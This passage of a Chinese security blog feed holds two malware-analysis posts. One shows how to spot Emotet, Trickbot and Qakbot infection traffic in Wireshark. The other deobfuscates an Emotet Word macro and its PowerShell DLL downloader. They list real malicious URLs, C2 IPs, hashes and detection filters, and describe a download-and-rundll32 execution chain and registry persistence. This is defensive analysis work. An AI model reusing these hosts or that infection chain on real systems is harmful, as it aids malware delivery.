        <content type="html"><![CDATA[<h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><h2 id="1-起源"><a href="#1-起源" class="headerlink" title="1.起源"></a>1.起源</h2><p>Emotet是一个信息窃取者，于2014年首次被报告为银行恶意软件。此后，它有了其他功能（例如，删除程序）进行了演变，分支了其他恶意软件家族，如Gootkit，IcedID，Qakbot和Trickbot。</p><p>由于上一篇从宏文件角度去分析Emotet银行木马的特征，但是本文从5个示例流量的区分是否是Emotet银行木马。同时可以帮助我们更好的溯源与分析。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-4.png" alt="2021-1-25-4"> </p><h2 id="2-了解"><a href="#2-了解" class="headerlink" title="2.了解"></a>2.了解</h2><p>要了解由Emotet引起的感染流量，我们必须首先了解导致感染的事件链。Emotet通常通过恶意垃圾邮件（malspam）电子邮件进行分发。Emotet感染链中的关键步骤是Microsoft Word文档，其中包含旨在感染易受攻击的Windows主机的宏。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-1.jpg" alt="2021-1-25-1"></p><p>垃圾邮件传播Emotet使用不同的技术来分发这些Word文档。下图说明了这四种感染技术。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-2.png" alt="2021-1-25-2"></p><p>  如果受害者打开文档并在易受攻击的Windows主机上启用了宏，则该主机感染了Emotet。</p><p>从流量的角度来看，我们看到从Emotet Word文档到Emotet感染的以下步骤：</p><ul><li>Web流量检索初始二进制文件。</li><li>通过HTTP的编码&#x2F;加密命令和控制（C2）通信。</li><li>如果Emotet丢弃了后续恶意软件，则会产生额外的感染流量。</li><li>如果Emotet使用受感染的主机作为垃圾邮件程序，则SMTP通信</li></ul><p>下图显示了我们在Emotet感染期间可能发现的网络活动的流程图</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-3.png" alt="2021-1-25-3"></p><h2 id="3-示例一-Emotet感染流量"><a href="#3-示例一-Emotet感染流量" class="headerlink" title="3.示例一 Emotet感染流量"></a>3.示例一 Emotet感染流量</h2><p>我们打开<strong>Example-1-2021-01-06-Emotet-infection.pcap</strong>，并对其HTTP&#x2F;HTTPS的基本过滤</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-5.png" alt="2021-1-25-5"></p><p>如上图所示，前五个HTTP GET请求代表用于检索初始Emotet DLL的四个URL。流量为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hangarlastik[.]com GET /cgi-bin/Ui4n/</span><br><span class="line">hangarlastik[.]com GET /cgi-sys/suspendedpage.cgi</span><br><span class="line">padreescapes[.]com GET /blog/0I/</span><br><span class="line">sarture[.]com GET /wp-includes/JD8/</span><br><span class="line">seo.udaipurkart[.]com GET /rx-5700-6hnr7/Sgms/</span><br></pre></td></tr></table></figure><p>我们来查看下 这个5个url的http响应是如何的，我们使用过滤器进行过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(http.request or http.response or tls.handshake.type eq 1) and !(ssdp)</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-6.png" alt="2021-1-25-6"></p><p>当我们看到最后一个url的时候是发现http未响应的，我们对其使用tcp流追踪。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-7.png" alt="2021-1-25-7"></p><p>追踪之后我们发现seo.udaipurkart [。] com返回了Windows DLL文件，如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-8.png" alt="2021-1-25-8"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-9.png" alt="2021-1-25-9"></p><p>我们对其导出文件,此提取的DLL的SHA256哈希为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8e37a82ff94c03a5be3f9dd76b9dfc335a0f70efc0d8fd3dca9ca34dd287de1b</span><br></pre></td></tr></table></figure><p>Emotet C2流量是使用HTTP POST请求发送的编码数据。您可以使用以下过滤器在Wireshark中轻松找到这些请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method eq POST</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-10.png" alt="2021-1-25-10"></p><p>在我们的第一个pcap中，Emotet C2流量由HTTP POST请求组成，这些请求包括：</p><ul><li>通过TCP端口80的5.2.136 [。] 90</li><li>TCP端口8080上为167.71.4 [。] 0</li></ul><p>Emotet为其C2流量生成两种类型的HTTP POST请求。第一种POST请求以HTTP &#x2F; 1.1结尾。第二种POST请求以HTTP&#x2F;1.1（application &#x2F; x-www-form-urlencoded）结尾。</p><p>按照针对初始HTTP请求的TCP流到达UTC 5.2.136 [。] 90（UTC时间16:42:34），以查看第一种C2 POST请求的示例，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-11.png" alt="2021-1-25-11"></p><p>上图显示了该POST请求发送了大约6 KB的表单数据，该表单数据似乎是编码的或加密的二进制文件。向下滚动到HTTP响应以查看从服务器返回的编码数据。下图显示了此编码数据的开始。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-12.png" alt="2021-1-25-12"></p><p>这种类型的编码或加密数据是Emotet僵尸网络服务器与受感染Windows主机交换数据的方式。这也是Emotet用于更新Emotet DLL并删除后续恶意软件的渠道。</p><p>针对Emotet C2流量的第二种HTTP POST请求看起来与第一种不同。在Wireshark中使用以下过滤器可以轻松找到第二种HTTP POST请求：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlencoded-form</span><br></pre></td></tr></table></figure><p>这应该通过TCP端口8080将两个HTTP POST请求返回到167.71.4 [。] 0，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-13.png" alt="2021-1-25-13"></p><p>在16:58:43 UTC遵循TCP流中的这两个HTTP POST请求中的第一个。查看流量。结果如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-14.png" alt="2021-1-25-14"></p><p>如上图所示，POST请求中发送的某些数据被编码为具有某些URL编码的base64字符串。例如，％2B被用于+符号，％2F表示&#x2F;和％3D是用于&#x3D;。</p><p>来自服务器的响应发送的数据被编码或以其他方式加密。</p><p>这个恶意pcap中没有后续的恶意软件或其他重要活动。</p><p>唯一的其他活动是通过TCP端口443重复尝试连接到46.101.230 [。] 194。我们使用以下Wireshark过滤器对其进行过滤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp.analysis.retransmission和tcp.flags eq 0x0002</span><br></pre></td></tr></table></figure><p>结果如下图所示。<img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-15.png" alt="2021-1-25-15"></p><p>在46.101.230 [。] 194上进行的Internet搜索应该显示此IP地址已用于Emotet C2活动。</p><p>pcap中的剩余流量是Microsoft Windows 10主机生成的系统流量。</p><h2 id="4-示例二-垃圾邮件流量的Emotet"><a href="#4-示例二-垃圾邮件流量的Emotet" class="headerlink" title="4.示例二 垃圾邮件流量的Emotet"></a>4.示例二 垃圾邮件流量的Emotet</h2><p>我们打开<strong>Example-2-2021-01-05-Emotet-with-spambot-traffic-part-1.pcap</strong>，并对其HTTP&#x2F;HTTPS的基本过滤</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-16.png" alt="2021-1-25-16"></p><p>与第一个示例类似，我们在Emotet C2流量之前收到了一些HTTP GET请求。这些GET请求是尝试通过网络流量下载初始Emotet DLL的尝试。列显示的第一帧显示到obob [。] tv的HTTPS流量，这可能是Web上对初始Emotet DLL的请求。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-17.png" alt="2021-1-25-17"></p><p>按照TCP流对miprimercamino [。] com的HTTP GET请求进行确认，以确认它返回了Emotet DLL。我们可以导出从miprimercamino [。] com返回的Emotet DLL ，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-18.png" alt="2021-1-25-18"></p><p>从第二个pcap中提取的DLL的SHA256哈希为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">963b00584d8d63ea84585f7457e6ddcac9eda54428a432f388a1ffee21137316</span><br></pre></td></tr></table></figure><p>同样，我们发现针对Emotet C2流量的两种HTTP POST请求。要针对每种Emotet C2 HTTP POST请求进行过滤，请使用以下Wireshark过滤器：</p><ul><li><p>第一种类型：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request method eq POST and !(urlencoded-form)</span><br></pre></td></tr></table></figure></li><li><p>第二种：</p></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlencoded-form</span><br></pre></td></tr></table></figure><p>跟踪这些过滤器返回的HTTP POST请求的TCP流，并确认它们在第一个pcap中看到的相同模式。</p><p>在查看了来自该pcap的Emotet C2流量的一些示例之后，让我们继续进行spambot活动。</p><p>在此示例中，我们被感染的主机变成了垃圾邮件机器人，因此我们也有SMTP通信。spambot SMTP流量已加密，但是我们可以使用基本的Web过滤器并向下滚动列显示轻松找到它。</p><p>在20:06:20 UTC时，pcap开始显示与SMTP电子邮件协议相关的TCP端口的SSL &#x2F; TLS通信，例如TCP端口25、465和587，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-20.png" alt="2021-1-25-20"></p><p>在建立加密的SMTP隧道之前，我们可以对smtp进行过滤以找到一些SMTP命令。下图显示了结果。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-19.png" alt="2021-1-25-19"></p><p>有时，我们可以从受Emotet感染的Windows主机生成的spambot流量中找到未加密的SMTP。未加密的SMTP将显示其邮件内容，但是来自spambot主机的加密SMTP的数量远远大于未加密的SMTP的数量。因此，来自受Emotet感染的主机的大多数spambot邮件都隐藏在加密流量中。</p><p>在此示例中，我们只看到加密的SMTP通信。</p><h2 id="5-示例三-Emotet和Spambot流量"><a href="#5-示例三-Emotet和Spambot流量" class="headerlink" title="5.示例三 Emotet和Spambot流量"></a>5.示例三 Emotet和Spambot流量</h2><p>我们打开<strong>Example-3-2021-01-05-Emotet-with-spambot-traffic-part-2.pcap</strong>，并对其HTTP&#x2F;HTTPS的基本过滤</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-21.png" alt="2021-1-25-21"></p><p>在此pcap中，我们仍然看到针对Emotet C2流量的HTTP POST请求，每分钟至少两次。我们还可以找到类似于之前的pcap的加密spambot活动。</p><p>Spambot活动经常产生大量流量。这个pcap包含来自受感染Windows主机的4分42秒的spambot活动，并且流量超过21 MB。</p><p>我们可以使用以下Wireshark筛选器快速识别任何未加密的SMTP通信：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtp.data.fragment</span><br></pre></td></tr></table></figure><p>下图显示了我们第三个pcap的过滤器结果。结果显示为5个Emotet垃圾邮件</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-22.png" alt="2021-1-25-22"></p><p>追踪TCP流中的最后一封电子邮件：“ Gladisbel Miranda，UTC时间20:19:54。，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-23.png" alt="2021-1-25-23"></p><p>之后呢 我们可以对其5个垃圾邮件进行导出和分析。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-24.png" alt="2021-1-25-24"></p><p>Emotet是恶意软件下载器。通过Emotet分发的最常见的恶意软件可能是Trickbot。</p><h2 id="6-示例四-用Trickbot感染Emotet"><a href="#6-示例四-用Trickbot感染Emotet" class="headerlink" title="6.示例四 用Trickbot感染Emotet"></a>6.示例四 用Trickbot感染Emotet</h2><p>我们打开<strong>Example-4-2021-01-05-Emotet-infection-with-Trickbot.pcap</strong>，并对其HTTP&#x2F;HTTPS的基本过滤</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-25.png" alt="2021-1-25-25"></p><p>此pcap没有针对初始Emotet DLL的HTTP GET请求。但是，我们在列显示中的第一帧显示到fathekarim [。] com的HTTPS流量。这可能是针对Emotet DLL的网络请求。</p><p>此pcap还包含Trickbot感染的迹象。使用基本的Web过滤器并向下滚动以查找Trickbot流量，如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-26.png" alt="2021-1-25-26"></p><p>以下是Trickbot的常见指标：</p><ul><li>在没有关联域或主机名的情况下，通过TCP端口447或449进行的HTTPS通信。</li><li>通过标准或非标准TCP端口的HTTP POST请求，以&#x2F;81 ，&#x2F;83 或&#x2F;90结尾的HTTP流量与数据渗透相关联。</li><li>使用受Emotet感染的Trickbot时，上述HTTP POST请求以&#x2F; mor开头，后跟一个数字（到目前为止只能看到一个或两个数字）。</li><li>对以.png结尾的URL的HTTP GET请求，返回其他Trickbot二进制文件。</li></ul><p>我们可以使用以下Wireshark过滤器轻松找到这些指标：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tls.handshake.type eq 1 and (tcp.port eq 447 or tcp.port eq 449)</span><br><span class="line"></span><br><span class="line">(http.request.uri contains /81 or http.request.uri contains /83 or http.request.uri contains /90) and http.request.uri contains mor</span><br><span class="line"></span><br><span class="line">http.request.uri contains .png</span><br></pre></td></tr></table></figure><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-27.png" alt="2021-1-25-27"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-28.png" alt="2021-1-25-28"></p><p>依据下图所示的每个HTTP POST请求的TCP流，以查看是否返回了Windows二进制文件。这样做应该显示两个Windows可执行文件。然后，使用文件–&gt;导出对象–&gt; HTTP从pcap导出这些二进制文件，如前面的示例中所述。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-29.png" alt="2021-1-25-29"></p><p>这两个Windows二进制文件（两个EXE文件）的SHA256哈希为：</p><ul><li><p>59e1711d6e4323da2dc22cdee30ba8876def991f6e476f29a0d3f983368ab461 for mingup.png</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-30.png" alt="2021-1-25-30"></p></li><li><p>ed8dea5381a7f6c78108a04344dc73d5669690b7ecfe6e44b2c61687a2306785 for save.png</p></li></ul><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-31.png" alt="2021-1-25-31"></p><p>Trickbot是Emotet分发的最常见的恶意软件，但并非唯一。Qakbot是另一种经常在感染了Emotet的Windows主机上丢弃的恶意软件。</p><h2 id="7-示例五-用Qakbot感染Emotet"><a href="#7-示例五-用Qakbot感染Emotet" class="headerlink" title="7.示例五 用Qakbot感染Emotet"></a>7.示例五 用Qakbot感染Emotet</h2><p>我们打开<strong>Example-5-2020-08-18-Emotet-infection-with-Qakbot.pcap</strong>，并对其HTTP&#x2F;HTTPS的基本过滤</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-32.png" alt="2021-1-25-32"></p><p>在我们最后的pcap中，21:23:50从saketpranamam.mysquare[。]in中检索了一个Emotet Word文档，该文档与报告为在同一日期托管Emotet Word文档的URL相匹配。如先前示例中所述，使用文件–&gt;导出对象–&gt; HTTP从pcap导出Word文档。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-33.png" alt="2021-1-25-33"></p><p>此提取的Word文档的SHA256哈希为：</p><ul><li>c7f429dde8986a1b2fc51a9b3f4a78a92311677a01790682120ab603fd3c2fcb</li></ul><p>此外，此pcap包含Qakbot感染的流量。如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-34.png" alt="2021-1-25-34"></p><p>以下是Qakbot的常见指标：</p><ul><li>通过HTTPS的标准和非标准TCP端口进行的HTTPS通信。</li><li>Qakbot HTTPS流量的证书数据在颁发者字段中具有异常值，并且证书不是由美国的颁发机构颁发的。</li><li>通过TCP端口65400的TCP流量。</li><li>2020年11月下旬之前，Qakbot通常生成到cdn.speedof [。] me的HTTPS流量。</li><li>2020年11月下旬之前，Qakbot通常会向a.strandsglobal [。] com生成HTTP GET请求。</li></ul><p>我们可以使用以下过滤器对其进行找到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tls.handshake.type eq 11 and !(x509sat.CountryName == US)</span><br><span class="line">tcp.port eq 65400</span><br><span class="line">tls.handshake.extensions_server_name contains speedof</span><br><span class="line">http.host contains strandsglobal</span><br></pre></td></tr></table></figure><p>下图所示第一个过滤器的结果在列显示中显示了来自71.80.66 [。] 107的流量的几帧。并找到异常的证书颁发者数据。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-35.png" alt="2021-1-25-35"></p><p>如下图所示我们找到了通过TCP端口65400的单个Qakbot通信的TCP流。此流包含受感染Qakbot的Windows主机的公共IP地址和僵尸网络标识字符串。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-25-36.png" alt="2021-1-25-36"></p><p>尽管Emotet通常删除了Trickbot和Qakbot，但要注意Emotet还删除了其他类型的恶意软件，例如Gootkit和IcedID。</p><h2 id="8-结论"><a href="#8-结论" class="headerlink" title="8.结论"></a>8.结论</h2><p>从感染流量的pcap中识别Emotet活动。我们回顾了五个最近的pcaps，发现由Emotet C2流量引起的HTTP POST请求中的相似之处。这些模式非常独特，可用于识别网络中的Emotet感染。我们还回顾了与Emotet相关的其他感染后活动，例如垃圾邮件程序流量和被感染主机上丢弃的各种恶意软件家族。</p><p>参考链接：</p><p><a href="https://unit42.paloaltonetworks.com/wireshark-tutorial-emotet-infection/">https://unit42.paloaltonetworks.com/wireshark-tutorial-emotet-infection/</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Emotet银行木马宏样本分析</title>
      <link href="/Emotet%E9%93%B6%E8%A1%8C%E6%9C%A8%E9%A9%AC%E5%AE%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html"/>
      <url>/Emotet%E9%93%B6%E8%A1%8C%E6%9C%A8%E9%A9%AC%E5%AE%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-32.jpg" alt="1"></p><span id="more"></span><h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><p>Emotet银行木马首次发现是在2014年6月份，此银行木马主要通过垃圾邮件的方式进行传播感染目标用户，是一款比较著名且复杂的银行木马。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-1.jpeg" alt="1"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-30.png" alt="30"></p><h3 id="二、样本运行流程"><a href="#二、样本运行流程" class="headerlink" title="二、样本运行流程"></a>二、样本运行流程</h3><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-2.png" alt="2"></p><h3 id="三、分析"><a href="#三、分析" class="headerlink" title="三、分析"></a>三、分析</h3><p>邮件附件DOC样本(重命名为2021-1-13-Emotet.doc)，如下所示：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-3.png" alt="3"></p><p>打开文档之后，如下：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-4.png" alt="4"></p><h4 id="3-1宏代码分析"><a href="#3-1宏代码分析" class="headerlink" title="3.1宏代码分析"></a>3.1宏代码分析</h4><p>使用oletools 套件的olevba，查看里面包含宏代码，如下：</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-5.png" alt="5"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-6.png" alt="6"></p><h4 id="3-2动态调试"><a href="#3-2动态调试" class="headerlink" title="3.2动态调试"></a>3.2动态调试</h4><p>从上面中我们隐约可以看到调用了WMI和一堆混淆。</p><p>我们这里直接去该文档的VBA编辑器，动态的调试，看到到底发生了什么。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-8.png" alt="8"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-9.png" alt="9"></p><p>此处我们可以看到由<strong>Document_open()<strong>函数调用</strong>Bn2p1rxokklh_9o8</strong></p><p>此处一共有3处函数，其中<strong>Bn2p1rxokklh_9o8()、Ipls8rqp952u2lk1(V8_prqa_b590f6uz6z)、Cws3jiyt47ovpsrhug(Mhb7dz_hsybhf0ic7)</strong></p><p>现在 这里我们直接在函数<strong>Ipls8rqp952u2lk1</strong>中的结束处进行下断点。让我们运行下看看</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-7.png" alt="7"></p><p>我们这里注意<strong>V8_prqa_b590f6uz6z</strong> <strong>和Ipls8rqp952u2lk1</strong>这两个变量</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-17.png" alt="17"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-10.png" alt="10"></p><p>在这里我们可以看到<strong>V8_prqa_b590f6uz6z</strong>变量为混淆的内容，而 <strong>Ipls8rqp952u2lk1</strong>最终的解密后的值为<strong>winmgmts:win32_process</strong>，这里混淆的key为最后一处函数 <strong>Cws3jiyt47ovpsrhug(Mhb7dz_hsybhf0ic7)</strong>,其中的 <strong>Replace</strong>引起了我们的注意，而<strong>w]xm[v</strong>就是我们的key</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-18.png" alt="18"></p><p>就像这样，如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-11.png" alt="11"></p><p>当执行到最后，我们也可以看到完整的执行代码</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-12.png" alt="12"></p><p>而完整的混淆代码为如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-13.png" alt="13"></p><p>使用key对其进行替换，如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-14.png" alt="14"></p><p>最终得出来的代码为如下图所示。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-15.png" alt="15"></p><p>下面为执行的过程。调用cmd 进行弹窗和调用powershell</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-16.png" alt="16"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-19.png" alt="19"></p><h4 id="3-3-PowerShell-分析"><a href="#3-3-PowerShell-分析" class="headerlink" title="3.3 PowerShell 分析"></a>3.3 PowerShell 分析</h4><p>我们对其powershell中的base64进行解密。得出的代码如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-20.png" alt="20"></p><p>我们可以看到powershell 也是进过混淆的，其中字符串的混淆为打乱排序,经过下图的类似的处理后</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-21.png" alt="21"></p><p>代码整理如下图所示</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-22.png" alt="22"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-23.png" alt="23"></p><p>大体该脚本执行的流程为</p><p>1.创建目录为下面下载的文件提供路径。</p><p>2.下载DLL文件并命名为S93E.dll</p><p>3.调用rundll32执行DLL。</p><h4 id="3-4DLL执行"><a href="#3-4DLL执行" class="headerlink" title="3.4DLL执行"></a>3.4DLL执行</h4><p>在上述过程中我对其中几个url分别进行验证。只有两个网址是可以下载DLL的</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-29.png" alt="29"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-25.png" alt="25"></p><p>两个DLL的md5是不同的，但是其功能是相同的，下图为完整的执行过程。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-24.png" alt="24"></p><p>在这里调用rundll32 执行dll文件使用期函数showdialogA。对其释放和执行另一个dll文件,最后进行自我删除第一个DLL的动作</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-26.png" alt="26"></p><p>并对其进行注册表修改，添加启动项,为其进行后期的控制。</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-27.png" alt="27"></p><p>同时我们可以看到 该DLL对外进行通信</p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-28.png" alt="28"></p><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/2021-1-15-31.png" alt="31"></p><h3 id="四、IOC"><a href="#四、IOC" class="headerlink" title="四、IOC"></a>四、IOC</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">文件名:&quot;QD0948945078TQ.doc&quot;</span><br><span class="line">sha256:27e5abb8149408da077133529e8da246c1003edc20974635d6757e05798d78c5</span><br><span class="line">sha1:3a7a405ef3df95c1cfa18284749ff885a6430a88</span><br><span class="line">md5:2b310974bb4a113881471845a109b3de</span><br><span class="line"></span><br><span class="line">DLL文件</span><br><span class="line">md5C:\Users\admin\Kjl48kr\Nqm9ty9\S93E.dll0a3a2efb412b08e886f9856a5093c6e4</span><br><span class="line">    md5C:\Users\admin\Kjl48kr\Nqm9ty9\S93E.dll617231616b57a1a09e14cf068d9c8a21</span><br><span class="line"></span><br><span class="line">DNS requests</span><br><span class="line">    www.starlingtechs.com</span><br><span class="line"></span><br><span class="line">Connections</span><br><span class="line">ip71.72.196.159</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/HTTPS 请求</span><br><span class="line">urlhttps://www.starlingtechs.com/GNM/</span><br><span class="line">urlhttp://71.72.196.159/3xjgiyzod/r2dsukigxsy2d/4r9mzyqmmbgte85/nemcrg565qsoiqnnoa/fgpz1c4ee1mmcc/4wuwc0y5xm79x/</span><br></pre></td></tr></table></figure><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://www.virustotal.com/gui/file/27e5abb8149408da077133529e8da246c1003edc20974635d6757e05798d78c5/behavior">https://www.virustotal.com/gui/file/27e5abb8149408da077133529e8da246c1003edc20974635d6757e05798d78c5/behavior</a></p><p><a href="https://app.any.run/tasks/beef10b6-bc74-4f38-adf4-b9a3e83082b3/">https://app.any.run/tasks/beef10b6-bc74-4f38-adf4-b9a3e83082b3/</a></p><p><a href="https://www.cynet.com/attack-techniques-hands-on/powershell-obfuscation-demystified-series-chapter-2-concatenation-and-base64-encoding/">https://www.cynet.com/attack-techniques-hands-on/powershell-obfuscation-demystified-series-chapter-2-concatenation-and-base64-encoding/</a></p>]]></content>
      
      
      <categories>
          
          <category> windows </category>
          
          <category> 恶意样本分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 恶意样本分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QakBot(Qbot)与cobalt Strike恶意流量样本分析</title>
      <link href="/QakBot(Qbot)%E4%B8%8Ecobalt%20Strike%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html"/>
      <url>/QakBot(Qbot)%E4%B8%8Ecobalt%20Strike%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90.html</url>
      
